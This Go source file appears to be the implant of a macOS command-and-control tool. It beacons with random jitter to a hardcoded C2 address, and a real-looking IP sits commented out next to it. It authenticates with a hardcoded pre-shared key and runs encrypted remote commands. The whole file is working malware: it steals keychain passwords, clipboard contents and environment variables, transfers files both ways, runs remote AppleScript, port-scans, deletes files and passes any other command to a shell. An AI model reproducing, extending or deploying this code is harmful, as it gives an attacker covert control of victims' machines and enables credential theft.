package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	encryption "github.com/grines/minic2/common"
	"github.com/grines/minic2/osx"
	syscall "github.com/grines/minic2/payload_func"
)

// 16/24 char PSK
const PSKPayload = "thisiscoolthisiscool1234"

// Local Development
const target = "127.0.0.1"

// const target = "143.198.97.230"
const port = "8008"

func main() {
	full_tareget := target + ":" + port
	fmt.Println("Running @: " + full_tareget)

	for {
		conn, err := net.Dial("tcp", full_tareget)
		if err != nil {
			log.Printf("Error connecting: %v\n", err)
			// Random delay between 5 and 30 seconds
			time.Sleep(time.Duration(rand.Intn(26)+5) * time.Second)
			continue
		}

		handleConnection(conn)
	}
}

func generateResponse(challenge string, psk string) string {
	// Simple example: concatenate and hash
	hash := sha256.Sum256([]byte(challenge + psk))
	return fmt.Sprintf("%x", hash)
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Read the challenge
	challenge, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		log.Printf("Error reading challenge: %v\n", err)
		return
	}

	// Generate and send the response
	response := generateResponse(strings.TrimSpace(challenge), PSKPayload)
	conn.Write([]byte(response + "\n"))

	reader := bufio.NewReader(conn)
	currentDir, err := os.Getwd()
	if err != nil {
		log.Printf("Error getting current directory: %v\n", err)
		return
	}

	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("Error reading command: %v\n", err)
			break
		}

		command := strings.TrimSpace(message)
		log.Printf("Command received: %s", command)

		// After reading the command
		decryptedCommand, err := encryption.Decrypt(strings.TrimSpace(command), PSKPayload)
		if err != nil {
			// Handle error
			log.Printf("Error: %s", err)
			continue
		}
		log.Printf("Command received: %s", decryptedCommand)

		parts := strings.Fields(decryptedCommand)
		if len(parts) == 0 {
			continue
		}

		switch parts[0] {
		case "osascript":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no data specified"))
				continue
			}
			osx.Run(parts[1])
			sendResponse(conn, "Osacript Executed")
		case "osascript_url":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no url specified"))
				continue
			}
			osx.Run_url(parts[1])
			sendResponse(conn, "Osacript Executed")
		case "env":
			environ := syscall.Env()
			sendResponse(conn, environ)
		case "ping":
			sendResponse(conn, "pong")
		case "whoami":
			who, err := syscall.Whoami()
			if err != nil {
				sendError(conn, err)
				continue
			}
			user := fmt.Sprintf("%v", who)
			sendResponse(conn, user)
		case "ps":
			processes := syscall.Ps()
			flattened := strings.Join(processes, "\n")
			sendResponse(conn, flattened)
		case "clipboard":
			clip := osx.Clipboard()
			sendResponse(conn, clip)
		case "screenshot":
			clip := osx.Screencapture()
			fmt.Println(clip[0].Data())
			fileContent, err := ioutil.ReadFile(parts[1])
			if err != nil {
				sendError(conn, err)
				continue
			}
			sendResponse(conn, string(fileContent))
		case "cd":
			// Find the index of the first space
			fmt.Println(decryptedCommand)
			spaceIndex := strings.Index(decryptedCommand, " ")
			if spaceIndex == -1 || spaceIndex == len(decryptedCommand)-1 {
				sendError(conn, fmt.Errorf("no directory specified"))
				continue
			}

			// Extract the directory path
			dirPath := decryptedCommand[spaceIndex+1:]

			// Change directory
			if err := os.Chdir(dirPath); err != nil {
				sendError(conn, err)
			} else {
				currentDir, _ = os.Getwd()
				sendResponse(conn, "Changed directory to "+currentDir)
			}
		case "download":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no file specified"))
				continue
			}
			fileContent, err := ioutil.ReadFile(parts[1])
			if err != nil {
				sendError(conn, err)
				continue
			}
			sendResponse(conn, string(fileContent))
		case "upload":
			if len(parts) < 3 {
				sendError(conn, fmt.Errorf("incorrect upload command"))
				continue
			}

			remotePath := parts[1]
			data, err := base64.StdEncoding.DecodeString(parts[2])
			if err != nil {
				sendError(conn, fmt.Errorf("error decoding file data"))
				continue
			}

			err = ioutil.WriteFile(remotePath, data, 0644)
			if err != nil {
				sendError(conn, err)
				continue
			}

			sendResponse(conn, "File uploaded successfully")
		case "pwd":
			sendResponse(conn, currentDir)
		case "keychain":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no keychain service specified"))
				continue
			}
			password, err := syscall.SecKeychainFindGenericPassword(parts[1])
			if err != nil {
				sendError(conn, fmt.Errorf("keychain service not found"))
				continue
			}
			sendResponse(conn, password)
		case "portscan":
			ports := syscall.Portscan()
			sendResponse(conn, ports)
		case "cp":
			if len(parts) < 3 {
				sendError(conn, fmt.Errorf("need: cp filepath tofilepath"))
				continue
			}
			syscall.Cp(parts[1], parts[2])
			sendResponse(conn, "Copied")
		case "mv":
			if len(parts) < 3 {
				sendError(conn, fmt.Errorf("need: mv filepath tofilepath"))
				continue
			}
			syscall.Mv(parts[1], parts[2])
			sendResponse(conn, "Moved")
		case "curl":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no url specified"))
				continue
			}
			curlData, _ := syscall.SimpleCurl(parts[1])
			sendResponse(conn, curlData)
		case "kill":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no PID specified"))
				continue
			}
			filedata := syscall.Kill(parts[1])
			sendResponse(conn, string(filedata))
		case "cat":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no file specified"))
				continue
			}
			filedata := syscall.Cat(parts[1])
			sendResponse(conn, string(filedata))
		case "rm":
			if len(parts) < 2 {
				sendError(conn, fmt.Errorf("no file specified"))
				continue
			}
			syscall.Rm(parts[1])
			sendResponse(conn, "Removed")
		case "ls":
			if len(parts) < 2 {
				filedata, err := syscall.List(".")
				if err != nil {
					sendError(conn, fmt.Errorf("error listing files"))
					continue
				}
				flattened := strings.Join(filedata, "\n")
				sendResponse(conn, string(flattened))
				continue
			}
			filedata, err := syscall.List(parts[1])
			if err != nil {
				sendError(conn, fmt.Errorf("error listing files"))
				continue
			}
			flattened := strings.Join(filedata, "\n")

			sendResponse(conn, string(flattened))

		default:
			cmd := exec.Command("sh", "-c", command)
			cmd.Dir = currentDir
			output, err := cmd.CombinedOutput()
			if err != nil {
				sendError(conn, err)
				continue
			}
			sendResponse(conn, string(output))
		}
	}
}

func sendError(conn net.Conn, err error) {
	// First, encrypt the error message
	encryptedError, encryptErr := encryption.Encrypt(err.Error(), PSKPayload)
	if encryptErr != nil {
		log.Printf("Error encrypting error response: %v\n", encryptErr)
		return
	}

	// Then, base64 encode the encrypted message
	encodedError := base64.StdEncoding.EncodeToString([]byte(encryptedError))

	// Finally, send the encoded message
	_, writeErr := conn.Write([]byte(encodedError + "\n"))
	if writeErr != nil {
		log.Printf("Error sending error response: %v\n", writeErr)
	}
}

func sendResponse(conn net.Conn, response string) {
	// First, encrypt the response
	encryptedOutput, encryptErr := encryption.Encrypt(response, PSKPayload)
	if encryptErr != nil {
		log.Printf("Error encrypting command output: %v\n", encryptErr)
		return
	}

	// Then, base64 encode the encrypted message
	encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))

	// Finally, send the encoded message
	_, writeErr := conn.Write([]byte(encodedOutput + "\n"))
	if writeErr != nil {
		log.Printf("Error sending command output: %v\n", writeErr)
	}
}
